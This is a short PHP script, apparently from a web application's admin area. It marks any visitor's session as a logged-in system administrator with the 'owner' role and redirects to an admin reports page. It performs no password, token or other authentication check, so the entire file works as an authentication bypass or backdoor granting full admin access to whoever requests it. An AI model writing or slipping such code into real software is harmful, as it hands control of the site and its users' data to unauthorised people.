<?php
session_start();
$_SESSION['admin_logged'] = true;
$_SESSION['admin_id'] = 1;
$_SESSION['admin_name'] = 'System Administrator';
$_SESSION['admin_role'] = 'owner';
header("Location: /esther.rest/admin/reports/");
exit();
